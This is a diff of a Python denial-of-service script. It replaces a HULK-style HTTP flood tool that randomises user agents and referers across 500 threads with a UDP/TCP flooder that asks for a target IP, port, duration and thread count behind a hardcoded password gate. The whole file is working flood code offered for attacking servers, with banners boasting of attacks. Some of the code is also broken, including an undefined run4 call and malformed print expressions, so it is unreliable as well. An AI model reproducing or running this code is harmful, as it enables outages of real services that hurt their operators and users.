@@ -1,176 +1,119 @@
-import os
-import urllib2
-import sys
-import threading
+# -*- coding: utf-8 -*-
+import logging
 import random
-import re
+import socket
+import threading
+import os
+import sys
+import time
+import fade
+os.system("clear")
 
-#global params
-url=''
-host=''
-headers_useragents=[]
-headers_referers=[]
-request_counter=0
-flag=0
-safe=0
+# Colors
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    UNDERLINE = '\033[4m'
+    PURPLE = '\033[97m'
+    BOLD    = "\033[1m"
+    BLACK   = "\033[30m"
+    RED     = "\033[31m"
+    GREEN   = "\033[32m"
+    YELLOW  = "\033[33m"
+    BLUE    = "\033[34m"
+    MAGENTA = "\033[35m"
+    CYAN    = "\033[36m"
+    WHITE   = "\033[37m"
 
-def inc_counter():
-	global request_counter
-	request_counter+=1
+attemps = 0
+os.system("clear")
+logo = """
+╔═════════════════════════════════════════════════════════════╗
+  ▓▓▓▓▓╗    ▓▓╗      ▓▓▓▓▓▓▓═╗   ▓═╗   ▓═╗ ▓═╗ ▓═╗
+  ▓╔═══╝  ▓╔═▓║     ▓ ╔════▓ ║  ▓ ║   ▓ ║ ▓ ║ ▓ ║
+  ▓║        ▓║    ▓║    ▓ ║     ▓ ║ ▓ ║   ▓ ║ ▓ ║ ▓ ║
+  ▓▓▓▓▓╗ ▓║     ▓║ ▓▓▓▓▓▓▓ ║ ▓ ║ ▓ ║
+  ╚═══▓║ ▓▓▓▓▓▓║ ╔═══╝▓ ╔═════▓ ║   ▓ ║     ▓ ║ ▓ ╔═══▓ ║ ▓ ║ ▓ ║
+  ▓▓▓▓▓║ ▓╔═══▓║      ▓ ║  ▓▓▓▓▓▓▓═╝   ▓ ║   ▓ ║ ▓ ║ ▓▓▓▓▓▓▓═╗
+  ╚════╝ ╚╝     ╚╝          ═╝ ╚═══════╝   ╚══   ╚══ ╚══ ╚═══════
 
-def set_flag(val):
-	global flag
-	flag=val
+ \033[33m                 BRIGADE ATTACKER SNIPER ELITE
+ \033[94m              FREEDOM IS THE RIGHT OF ALL NATIONS
+╚════════════════════════════════════════════════════════════╝
+"""
+faded_text = fade.fire(logo)
+print(faded_text)
+while attemps < 100:
+    username = input("\033[33mEnter your username: \033[0m")
+    password = input("\033[32mEnter your password: \033[0m")
 
-def set_safe():
-	global safe
-	safe=1
-	
+    if username == 'salman' and password == 'kondangan-dl':
+        print('Selamat datang di zona SALMAN SENDIRI')
+        break
+    else:
+        print('Incorrect credentials. Check if you have Caps lock on and try again.')
+        attemps += 1
+        continue
 
-def useragent_list():
-	global headers_useragents
-	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
-	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
-	return(headers_useragents)
-
-# generates a referer array
-def referer_list():
-	global headers_referers
-	headers_referers.append('http://www.google.com/?q=')
-	headers_referers.append('http://www.usatoday.com/search/results?q=')
-	headers_referers.append('http://engadget.search.aol.com/search?q=')
-	headers_referers.append('http://' + host + '/')
-	return(headers_referers)
-	
-
-def buildblock(size):
-	out_str = ''
-	for i in range(0, size):
-		a = random.randint(95, 165)
-		out_str += chr(a)
-	return(out_str)
-
-def usage():
-	print '.=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-.'
-	print '|                     ______                     |'
-	print '|                  .-"      "-.                  |'
-	print '|                 /            \                 |'
-	print '|     _          |              |          _     |'
-	print '|    ( \         |,  .-.  .-.  ,|         / )    |'
-	print '|     > "=._     | )(__/  \__)( |     _.=" <     |'
-	print '|    (_/"=._"=._ |/     /\     \| _.="_.="\_)    |'
-	print '|           "=._"(_     ^^     _)"_.="           |'
-	print '|               "=\__|IIIIII|__/="               |'
-	print '|              _.="| \IIIIII/ |"=._              |'
-	print '|    _     _.="_.="\          /"=._"=._     _    |'
-	print '|   ( \_.="_.="     `--------`     "=._"=._/ )   |'
-	print '|    > _.="                            "=._ <    |'
-	print '|   (_/           MADE BY D1MOD18          \_)   |'
-	print '|           https://discord.gg/hn7epsef4Z        |'
-	print '|               https://d1modshop.ml             |'
-	print  '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-='
-
-#http request
-def httpcall(url):
-	useragent_list()
-	referer_list()
-	code=0
-	if url.count("?")>0:
-		param_joiner="&"
-	else:
-		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
-	request.add_header('User-Agent', random.choice(headers_useragents))
-	request.add_header('Cache-Control', 'no-cache')
-	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
-	request.add_header('Keep-Alive', random.randint(110,120))
-	request.add_header('Connection', 'keep-alive')
-	request.add_header('Host',host)
-	try:
-			urllib2.urlopen(request)
-	except urllib2.HTTPError, e:
-			#print e.code
-			set_flag(1)
-			print '.=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-.'
-			print '|                ATTACKED STARTED                |'
-	                print '|                     ______                     |'
-	                print '|                  .-"      "-.                  |'
-	                print '|                 /            \                 |'
-	                print '|     _          |              |          _     |'
-	                print '|    ( \         |,  .-.  .-.  ,|         / )    |'
-	                print '|     > "=._     | )(__/  \__)( |     _.=" <     |'
-	                print '|    (_/"=._"=._ |/     /\     \| _.="_.="\_)    |'
-	                print '|           "=._"(_     ^^     _)"_.="           |'
-	                print '|               "=\__|IIIIII|__/="               |'
-	                print '|              _.="| \IIIIII/ |"=._              |'
-	                print '|    _     _.="_.="\          /"=._"=._     _    |'
-	                print '|   ( \_.="_.="     `--------`     "=._"=._/ )   |'
-	                print '|    > _.="                            "=._ <    |'
-	                print '|   (_/           MADE BY D1MOD18          \_)   |'
-	                print '|           https://discord.gg/hn7epsef4Z        |'
-	                print '|               https://d1modshop.ml             |'
-	                print  '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-='
-			code=500
-	except urllib2.URLError, e:
-			#print e.reason
-			sys.exit()
-	else:
-			inc_counter()
-			urllib2.urlopen(request)
-	return(code)		
-
-	
-#http caller thread 
-class HTTPThread(threading.Thread):
-	def run(self):
+ip = str(input("\033[37m Target IP : \033[0m"))
+port = int(input("\033[36m Target Port : \033[0m"))
+choice = str(input("\033[35m (y/n) : \033[0m"))
+times = int(input("\033[34m Time : \033[0m"))
+threads = int(input("\033[33m Threads : \033[0m"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[+]","[*]","[!]"))
+	while True:
 		try:
-			while flag<2:
-				code=httpcall(url)
-				if (code==500) & (safe==1):
-					set_flag(2)
-		except Exception, ex:
-			pass
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" \033[33mF A D H I L  \033[31mHTTP \033[32mFL00D  \033[36m" +str(ip)+ "\033[37m = \033[96mattack run\033[0m")
+		except:
+			print(i +" \033[35mF A D H I L  \033[32mHTTP \033[33mFL00D  \033[96m" +str(ip)+ "\033[37m = \033[1mattack run\033[0m")
+def run2():
+	data = random._urandom(999)
+	i = random.choice(("[+]","[*]","[!]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i *" \033[35mF A D H I L  \033[32mHTTP \033[33mFL00D  \033[96m" +str(ip)+ "\033[37m = \033[1mattack run\033[0m")
+		except:
+			s.close()
+			print(i +" \033[4mfinnaly run\033[0m")
+            
 
-class MonitorThread(threading.Thread):
-	def run(self):
-		previous=request_counter
-		while flag==0:
-			if (previous+500<request_counter) & (previous<>request_counter):
-				print "%d D1MOD ATTACKED THE SERVER -->" % (request_counter)
-				previous=request_counter
-		if flag==2:
-			print "\n-- D1MOD Attack Finished --"
-
-
-if len(sys.argv) < 2:
-	usage()
-	sys.exit()
+def run3():
+	data = random._urandom(818)
+	i = random.choice(("[+]","[*]","[!]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i *" \036[4mBASE2  \033[37mHTTP flood  \033[35m" +str(ip)+ "::.... \033[0m")
+		except:
+			s.close()
+			print(i *" \036[33mBASE2  \033[37mHTTP flood  \033[4m" +str(ip)+ "::. \033[0m")
+							
+            
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+		
 else:
-	if sys.argv[1]=="help":
-		usage()
-		sys.exit()
-	else:
-		print "_<-- D1MOD ATTACK STARTED --->"
-			if sys.argv[2]=="safe":
-				set_safe()
-		url = sys.argv[1]
-		if url.count("/")==2:
-			url = url + "/"
-		m = re.search('(https?\://)?([^/]*)/?.*', url)
-		host = m.group(2)
-		for i in range(500):
-			t = HTTPThread()
-			t.start()
-		t = MonitorThread()
-		t.start()
+		th = threading.Thread(target = run4)
+		th.start()
